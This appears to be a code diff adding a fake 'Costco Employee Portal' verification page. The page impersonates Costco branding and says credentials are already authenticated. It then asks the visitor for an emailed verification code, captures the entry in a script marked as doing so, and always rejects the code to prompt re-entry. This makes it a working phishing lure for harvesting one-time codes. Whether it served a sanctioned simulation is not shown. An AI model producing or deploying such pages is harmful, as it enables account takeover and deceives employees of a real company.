@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Access - Costco Employee Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 450px;
+            padding: 30px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 60px;
+        }
+        h1 {
+            color: #003da6;
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        .verification-box {
+            background-color: #e8f4ff;
+            border: 1px solid #b8daff;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 15px;
+        }
+        input {
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            width: 90%;
+        }
+        button {
+            background-color: #003da6;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #002d7a;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #003da6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-message {
+            color: #555;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="costco-logo.png" alt="Costco Wholesale" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAA8CAMAAAD48GC1AAAAn1BMVEUAM6H///8ALp8AJJwAKp4AIZsAHpoAGJgAEJYAFpfw8/kADJUAAJMABpT3+PsAC5X7/P3a3+3r7vXj5/Etscbg5PBoerRLgLlMYK0cQqScqM5tfrZzhbnGzOJldLKImMMAU6/P1ed3h7qptdQjSaaBkcK/x99GfLlYaa9+j8AAPKbV2upOZK4PP6N4i78AObWxu9gwUqdUibsAN7QsT6eUpczUJUe/AAADUklEQVRoge2aYXOiMBCGIQkgtogI0laqWG/qeXrXq73//7NdEAzQhDbXxvFmmPdDd2xZ82QX4sLiOIqiKIqiKIqiKMrrkXtv4KV5cxtcXt0Pvbf0+Yze3YZRwBcM/d574wdjFEVRFEVRFEVRFEVRFEVRFEX5HwghkZD1TSSGKVOQDMu4vvjEiVWIlHAzixsj3NzdJr1fUngcY6N3X28s4tGTzfRKH5O1N0LJZgmA7yQAdJ9tz06HY2N9A+D+ZNGB32Zn3Z1VuKkV+p5j5U2vNJ7q9GpudIxLB3TZ+HhyYoPhVKeTjhNrdCZAWodEuD5YdUVoNLDPTe2rk0K9kfGk0GuXTlfXVxqdrcvmsDqz0KMz2P53oPRCw/e2dTpdH6jTzgrd+2UHzXpC1MO4PWl5vISoN3JKoWkEVrJKR9vjRi99cLyHHrjMN7Pj9naxnnXmxWpX5m7ky3GySSY03W2zF27SLmuxwkqXrSHQbrsVgNJYLPTUf0wemHm4e1jkRWNzcJ6W/dVJrCjGRaE3z1NP6GtOOotuIpNqDUG8qQXu5EqXrQkwLDYrFJq9V5XPmM1pOZ+Ug1Wy7VhRjPKdZ/nQ1IskOtXb7EUEw8xIhBN0TdCtSnf2HQBf3EWh0PyoKg/YvJmPy8GXvZ+iohjVOzCdYjO9yWIrtG9eI+oqjRJsAYBsvbnQZctpSHvSJrr4zjnzbJ7vh4v9vJZO8rWgQGYXuvYJ4sZrXqKLVoGdRXP+nULzgI3zQmJbLZAQXeyi0OmqZqv//cITYXSiGRg0BkjNrJaEwCY8Oq+R0GXLbbiZN7rCwO1/odBlVtjbQnOwk0XjqGHtHLQZTxfF8hy8d51OvdGUCR3AKz1Ct/ZCl63uPqoPC/1gGTxFUdwKjeK3CY0ubMTVRmjHaAaW0MOHRw6H0KVd6La/lTbRkVRonCKh0b7fXGi0i5qjkwvtcRy3TMc9x49Fjzq9QOkQCu3gQuPDXVxoqrRc6IUHrngQCR3n62wCUJwIhb5A5jgTuh0vgWu1YdRfigR8qQh8KRDIU5F8L3Y2XTwuHspgcTOXR3/sTBRFURRFURRFUZR/wjfhkkx4QUvEhwAAAABJRU5ErkJggg=='" style="max-width: 100%;">
+        </div>
+        
+        <h1>Access Verification Required</h1>
+        
+        <div class="loader"></div>
+        
+        <p class="status-message">Credentials authenticated. One more step required.</p>
+        
+        <div class="verification-box">
+            <p><strong>Security Notice:</strong> To protect confidential Q2 briefing materials, we need to verify your Costco employee email address.</p>
+            
+            <div class="verification-form">
+                <input type="text" id="verification-code" placeholder="Enter the verification code sent to your email">
+                <button id="verify-button">Complete Verification</button>
+            </div>
+            
+            <p style="font-size: 13px; margin-top: 15px;">A verification code has been sent to your Costco email address. Please check your inbox and enter the code above.</p>
+        </div>
+        
+        <p style="color: #777; font-size: 14px;">This additional step helps us ensure confidential materials are only accessed by authorized personnel.</p>
+        
+        <div class="footer">
+            <p>© 2025 Costco Wholesale. Internal use only.</p>
+            <p>Having trouble? Contact IT support at ext. 4825</p>
+        </div>
+    </div>
+
+    <script>
+        // This would capture any verification code entered
+        document.getElementById('verify-button').addEventListener('click', function() {
+            const verificationCode = document.getElementById('verification-code').value;
+            console.log("Verification code entered:", verificationCode);
+            
+            // Show "processing" message
+            document.querySelector('.status-message').textContent = "Verifying code...";
+            
+            // Simulate processing delay
+            setTimeout(function() {
+                document.querySelector('.status-message').textContent = "Invalid verification code. Please check your email again.";
+                document.getElementById('verification-code').value = "";
+                document.getElementById('verification-code').focus();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
